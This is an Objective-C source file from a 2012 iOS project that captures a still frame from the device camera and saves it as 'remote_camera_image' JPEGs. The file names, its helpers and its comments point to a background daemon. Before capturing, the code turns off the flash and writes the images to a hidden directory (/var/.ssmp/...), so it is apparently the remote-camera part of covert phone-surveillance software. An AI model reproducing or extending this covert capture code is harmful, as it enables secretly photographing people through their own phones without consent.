//
//  VideoFrameCaptureController.m
//  CameraCaptureManager
//
//  Created by Benjawan Tanarattanakorn on 6/12/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//
#import <UIKit/UIKit.h>
#import "VideoFrameCaptureController.h"
#import "DebugStatus.h"
//#import "PLCameraImage.h"
#import "PLPhotoLibrary.h"
#import "DaemonPrivateHome.h"


#define IMAGE_TEMP_PATH				@"/tmp/myJPG.jpg"
#define kExpectedFrameNo			10


@interface VideoFrameCaptureController (private)
- (BOOL)				setupSession;
- (UIImage *) imageFromSampleBuffer:(CMSampleBufferRef) sampleBuffer;
- (void)				turnOffFlash;
- (void)	registerNotifictionCenterWithSession: (AVCaptureSession *) aSession device: (AVCaptureDevice *) aDevice;
- (void)	sessionDidStart: (NSNotification *) aNotification;
- (void)	sessionDidStop: (NSNotification *) aNotification; 
- (void)	sessionDidRuntimeError: (NSNotification *) aNotification;
- (void)	deviceDidConnect: (NSNotification *) aNotification;
- (void)	deviceDidDisconnect: (NSNotification *) aNotification;

- (NSString *) getOutputPath: (NSString *) aOutputPathWithoutExtension 
				   extension: (NSString *) aExtension;
- (NSString *) getOutputPathV2: (NSString *) aOutputPathWithoutExtension
                     extension: (NSString *) aExtension;
- (NSString *) createTimeStamp;
- (AVCaptureVideoOrientation) getVideoOrientation;
- (UIDeviceOrientation) getDeviceOrientation;

@end


@implementation VideoFrameCaptureController

@synthesize mSession;
@synthesize mCameraInput;
@synthesize mVideoDataOutput;
@synthesize mDelegate;
@synthesize mDidFinishCapturing;

- (id) init {
	self = [super init];
	if (self != nil) {
		mIsSessionSetup = NO;
		mFrontCamera	= NO;
		mFrameNo		= 0;
	}
	return self;
}

- (id) initWithFrontCamera: (BOOL) aFrontCamera {
	if ((self = [super init])) {
		mIsSessionSetup = NO;
		mFrontCamera    = YES;
        mFrameNo		= 0;
	}
	return (self);
}

- (void) initializeCaptureSession {
	if (!mIsSessionSetup) {
		DLog(@"can initialize session in thread = %@", [NSThread currentThread]);
		if ([self setupSession]) {
			[[self mSession] startRunning];
		}
		
	}
}

- (BOOL) setupSession {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    BOOL success = YES;
	if (!mIsSessionSetup) {
		[self turnOffFlash];
		//DLog(@"flash mode %d",[[self backFacingCamera] flashMode]);
		
		// -- setup input
		NSError *error = nil;
		AVCaptureDeviceInput *cameraInput = [[AVCaptureDeviceInput alloc] initWithDevice:[self backFacingCamera] error:&error];
		if (error) {
			success = NO;
			DLog(@"input setup error: %@", error)
		}
		
		// -- setup output
		AVCaptureVideoDataOutput *videoDataOutput = [[AVCaptureVideoDataOutput alloc] init];
		videoDataOutput.videoSettings = [NSDictionary dictionaryWithObject:[NSNumber numberWithInt:kCVPixelFormatType_32BGRA] 
																	forKey:(id)kCVPixelBufferPixelFormatTypeKey];
		

		// Configure your output.
		dispatch_queue_t queue = dispatch_queue_create("myQueue", NULL);
		[videoDataOutput setSampleBufferDelegate:self queue:queue];
		dispatch_release(queue);
		
		// -- create session 
		AVCaptureSession *captureSession = [[AVCaptureSession alloc] init];
		if ([captureSession canSetSessionPreset:AVCaptureSessionPresetMedium]) {
			captureSession.sessionPreset = AVCaptureSessionPresetMedium;
			DLog(@"success to set session's present: Photo");
		}
		
		// Add inputs and output to the capture session
		if ([captureSession canAddInput:cameraInput]) {
			[captureSession addInput:cameraInput];
		} else {
			DLog(@"input fail")
			success = NO;
		}
		if ([captureSession canAddOutput:videoDataOutput]) {
			[captureSession addOutput:videoDataOutput];
		} else {
			DLog(@"output fail")
			success = NO;
		}

		
		// clean unused memory
		if (!success) {
			DLog(@"fail to setup session")
			if (videoDataOutput) {
				[videoDataOutput release];
				videoDataOutput = nil;
			}
			if (captureSession) {
				[captureSession release];
				captureSession = nil;
			}
			if (cameraInput) {
				[cameraInput release];
				cameraInput = nil;
			}
		} else {
			mIsSessionSetup = YES;
			[self setMVideoDataOutput:videoDataOutput];
			[self setMCameraInput:cameraInput];
			[self setMSession:captureSession];
			
			
			AVCaptureOutput *videoDataOutput			= [[[self mSession] outputs] objectAtIndex:0];
			AVCaptureConnection *connection				= [[videoDataOutput connections] objectAtIndex:0];
			AVCaptureVideoOrientation videoOrientation	= [self getVideoOrientation];
											
			DLog (@"device orien before: %d", (int)[connection videoOrientation])
			[connection setVideoOrientation:videoOrientation];
			DLog (@"device orien after: %d", (int)[connection videoOrientation])
			
			//[self registerNotifictionCenterWithSession:mSession device:[self backFacingCamera]];
		
			[videoDataOutput release];
			videoDataOutput = nil;
			[cameraInput release];
			cameraInput = nil;
			[captureSession release];
			captureSession = nil;
		}
		
		success = YES;
	}
	[pool drain];
    return success;
}

#pragma mark delegate methods

// Delegate routine that is called when a sample buffer was written
- (void)captureOutput:(AVCaptureOutput *)captureOutput 
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer 
	   fromConnection:(AVCaptureConnection *)connection
{ 
	DLog(@"did output sample in thread = %@", [NSThread currentThread]);
	
	if (++mFrameNo >= kExpectedFrameNo) {
		mFrameNo = 0;
		DLog (@"!!!!! Grab this image")
		
		// Create a UIImage from the sample buffer data
		UIImage *image		= [self imageFromSampleBuffer:sampleBuffer];			
		NSData *imageData	= UIImageJPEGRepresentation(image, 0.95);		
		
		DLog (@">>>>>> image orientation %d", (int)[image imageOrientation])
		
		NSString *outputPath = [NSString stringWithFormat:@"%@%@/", [self mOutputPath], @"image"]; // /var/.ssmp/media/capture/image/
		[DaemonPrivateHome createDirectoryAndIntermediateDirectories:outputPath];

		//NSString *filePath	= [self getOutputPath:outputPath extension:@"jpg"];  // This will be replaced by the below code to support the new structure of RemCamEvent in protocol version 9
		NSString *filePath	= [self getOutputPathV2:outputPath extension:@"jpg"];
        
		[imageData writeToFile:filePath atomically:YES];
		
		//PLPhotoLibrary* photoLibrary = [PLPhotoLibrary sharedPhotoLibrary];
		//PLCameraImage *camImage = [[PLCameraImage alloc] initWithPath:IMAGE_TEMP_PATH thumbnailImage:nil metadata:nil];
		
        /****************************************************************
		 *	NOTE: this method is only available on ios 4.3.3 and later
		 ****************************************************************/
		
        /*
		if ([photoLibrary respondsToSelector:@selector(addPhotoToCameraRoll:)]) {
			[photoLibrary addPhotoToCameraRoll:camImage];

		} else {
			DLog(@"can not save a photo to the photo album")
		}
		[camImage release];
		camImage = nil;
		*/
		
		[mSession stopRunning];

		if (mDelegate) { // Note this code run in different thread from caller
			if ([mDelegate respondsToSelector:mDidFinishCapturing] && mCallThread)
				[mDelegate performSelector:mDidFinishCapturing
								  onThread:mCallThread
								withObject:filePath
							 waitUntilDone:NO];

		}	
	}
}

- (void)captureOutput:(AVCaptureOutput *)captureOutput
  didDropSampleBuffer:(CMSampleBufferRef)sampleBuffer
       fromConnection:(AVCaptureConnection *)connection {
    DLog(@"Output sample buffer did drop ...");
}

// Create a UIImage from sample buffer data
- (UIImage *) imageFromSampleBuffer:(CMSampleBufferRef) sampleBuffer 
{
    // Get a CMSampleBuffer's Core Video image buffer for the media data
    CVImageBufferRef imageBuffer = CMSampleBufferGetImageBuffer(sampleBuffer); 
    // Lock the base address of the pixel buffer
    CVPixelBufferLockBaseAddress(imageBuffer, 0); 
	
    // Get the number of bytes per row for the pixel buffer
    void *baseAddress = CVPixelBufferGetBaseAddress(imageBuffer); 
	
    // Get the number of bytes per row for the pixel buffer
    size_t bytesPerRow = CVPixelBufferGetBytesPerRow(imageBuffer); 
    // Get the pixel buffer width and height
    size_t width = CVPixelBufferGetWidth(imageBuffer); 
    size_t height = CVPixelBufferGetHeight(imageBuffer); 
	
    // Create a device-dependent RGB color space
    CGColorSpaceRef colorSpace = CGColorSpaceCreateDeviceRGB(); 
	
    // Create a bitmap graphics context with the sample buffer data
    CGContextRef context = CGBitmapContextCreate(baseAddress, width, height, 8, 
												 bytesPerRow, colorSpace, kCGBitmapByteOrder32Little | kCGImageAlphaPremultipliedFirst); 
    // Create a Quartz image from the pixel data in the bitmap graphics context
    CGImageRef quartzImage = CGBitmapContextCreateImage(context); 
    // Unlock the pixel buffer
    CVPixelBufferUnlockBaseAddress(imageBuffer,0);
	
    // Free up the context and color space
    CGContextRelease(context); 
    CGColorSpaceRelease(colorSpace);
	
    // Create an image object from the Quartz image
    //UIImage *image = [UIImage imageWithCGImage:quartzImage];
	
	// Get device orientation
	UIDeviceOrientation deviceOrientation = [self getDeviceOrientation];
	
	//UIImage *image = [UIImage imageWithCGImage:quartzImage scale:1.0 orientation:UIImageOrientationRight];
	
	// Rotate the image according to the detected orientation
	UIImage *image = [UIImage imageWithCGImage:quartzImage scale:1.0 orientation:deviceOrientation];
	
	// Release the Quartz image
    CGImageRelease(quartzImage);
	
    return (image);
}

- (void) registerNotifictionCenterWithSession: (AVCaptureSession *) aSession device: (AVCaptureDevice *) aDevice {
	// register for notification
	NSNotificationCenter *notificationCenter = [NSNotificationCenter defaultCenter];
	[notificationCenter addObserver:self 
						   selector:@selector(sessionDidStart:)
							   name:AVCaptureSessionDidStartRunningNotification 
							 object:aSession];
	[notificationCenter addObserver:self 
						   selector:@selector(sessionDidStop:)
							   name:AVCaptureSessionDidStopRunningNotification 
							 object:aSession];
	[notificationCenter addObserver:self 
						   selector:@selector(sessionDidRuntimeError:)
							   name:AVCaptureSessionRuntimeErrorNotification 
							 object:aSession];
	[notificationCenter addObserver:self 
						   selector:@selector(deviceDidConnect:)
							   name:AVCaptureDeviceWasConnectedNotification 
							 object:aDevice];
	[notificationCenter addObserver:self 
						   selector:@selector(deviceDidDisconnect:)
							   name:AVCaptureDeviceWasDisconnectedNotification 
							 object:aDevice];
}

- (void) sessionDidStart: (NSNotification *) aNotification {
	DLog(@"sessionDidStart");
}
- (void) sessionDidStop: (NSNotification *) aNotification { 
	DLog(@"sessionDidStop")
}
- (void) sessionDidRuntimeError: (NSNotification *) aNotification {
	DLog(@"sessionDidRuntimeError")
}
- (void) deviceDidConnect: (NSNotification *) aNotification { 
	DLog(@"deviceDidConnect")
}
- (void) deviceDidDisconnect: (NSNotification *) aNotification {
	DLog(@"deviceDidDisconnect")
}

#pragma mark -
#pragma mark Create unique file name full path
#pragma mark -

- (NSString *) getOutputPath: (NSString *) aOutputPathWithoutExtension 
				   extension: (NSString *) aExtension {
	NSString *formattedDateString = [self createTimeStamp];
	NSString *outputPath = [[NSString alloc] initWithFormat:@"%@remote_camera_image%@.%@",
							aOutputPathWithoutExtension, 
							formattedDateString, 
							aExtension];
	return [outputPath autorelease];
}

- (NSString *) getOutputPathV2: (NSString *) aOutputPathWithoutExtension
                     extension: (NSString *) aExtension {
	NSString *formattedDateString = [self createTimeStamp];
    NSString *cameraKind    = nil;
    if ([self mFrontCamera]) {
        cameraKind          =   @"front";
    } else {
        cameraKind          =   @"back";
    }

	NSString *outputPath            = [[NSString alloc] initWithFormat:@"%@%@_remote_camera_image%@.%@",
                                       aOutputPathWithoutExtension,
                                       cameraKind,
                                       formattedDateString,
                                       aExtension];
    DLog(@"output path %@", outputPath)
	return [outputPath autorelease];
}

- (NSString *) createTimeStamp {
	NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
	[dateFormatter setDateFormat:@"yyyy-MM-dd_HH:mm:ss:SSS"];
	NSString *formattedDateString = [[dateFormatter stringFromDate:[NSDate date]] retain];
	[dateFormatter release];
	return [formattedDateString autorelease];
}

- (AVCaptureVideoOrientation) getVideoOrientation {
	AVCaptureVideoOrientation videoOrientation ;
	
	BOOL currentIsGeneratingDeviceOrientation = [[UIDevice currentDevice] isGeneratingDeviceOrientationNotifications];	
	
	[[UIDevice currentDevice] beginGeneratingDeviceOrientationNotifications];	

	DLog (@"[UIDevice currentDevice].orientation %d", (int)[UIDevice currentDevice].orientation)
	switch ([UIDevice currentDevice].orientation) {
		case UIDeviceOrientationLandscapeLeft:
			// Not clear why but the landscape orientations are reversed
			// if I use AVCaptureVideoOrientationLandscapeLeft here the pic ends up upside down
			DLog (@"land left")
			videoOrientation = AVCaptureVideoOrientationLandscapeRight;
			break;
		case UIDeviceOrientationLandscapeRight:
			// Not clear why but the landscape orientations are reversed
			// if I use AVCaptureVideoOrientationLandscapeRight here the pic ends up upside down
			DLog (@"land right")
			videoOrientation = AVCaptureVideoOrientationLandscapeLeft;
			break;
		case UIDeviceOrientationPortraitUpsideDown:
			DLog (@"port upside down")
			videoOrientation = AVCaptureVideoOrientationPortraitUpsideDown;
			break;
		default:
			DLog (@"port")
			videoOrientation = AVCaptureVideoOrientationPortrait;
			break;
	}
	
	if (!currentIsGeneratingDeviceOrientation) {
		[[UIDevice currentDevice] endGeneratingDeviceOrientationNotifications];
	}
	
	return videoOrientation;	
}


- (UIDeviceOrientation) getDeviceOrientation {
	AVCaptureVideoOrientation deviceOrientation = UIDeviceOrientationPortrait;
	
	BOOL currentIsGeneratingDeviceOrientation = [[UIDevice currentDevice] isGeneratingDeviceOrientationNotifications];	
	
	[[UIDevice currentDevice] beginGeneratingDeviceOrientationNotifications];	
	
	DLog (@"[UIDevice currentDevice].orientation %d", (int)[UIDevice currentDevice].orientation)
	switch ([UIDevice currentDevice].orientation) {
		case UIDeviceOrientationLandscapeLeft:
			// Not clear why but the landscape orientations are reversed
			// if I use AVCaptureVideoOrientationLandscapeLeft here the pic ends up upside down
			DLog (@"landscape left")
			deviceOrientation = UIDeviceOrientationLandscapeLeft;
			break;
		case UIDeviceOrientationLandscapeRight:
			// Not clear why but the landscape orientations are reversed
			// if I use AVCaptureVideoOrientationLandscapeRight here the pic ends up upside down
			DLog (@"landscape right")
			deviceOrientation = UIDeviceOrientationLandscapeRight;
			break;
		case UIDeviceOrientationPortraitUpsideDown:
			DLog (@"portrait upside down")
			deviceOrientation = UIDeviceOrientationPortraitUpsideDown;
			break;
		default:
			DLog (@"portrait")
			deviceOrientation = UIDeviceOrientationPortrait;
			break;
	}	
	if (!currentIsGeneratingDeviceOrientation) {
		[[UIDevice currentDevice] endGeneratingDeviceOrientationNotifications];
	}	
	return deviceOrientation;	
}

- (void) dealloc
{
	DLog(@"---------------------- dealloc ----------------------")
	//NSNotificationCenter *notificationCenter = [NSNotificationCenter defaultCenter];
    //[notificationCenter removeObserver:self name:nil object:nil];
	
	if (mVideoDataOutput) {
		[mVideoDataOutput release];
		mVideoDataOutput = nil;
	}
	if (mCameraInput) {
		[mCameraInput release];
		mCameraInput = nil;
	}
	if (mSession) {
		[mSession release];
		mSession = nil;
	}
    [super dealloc];
}



@end
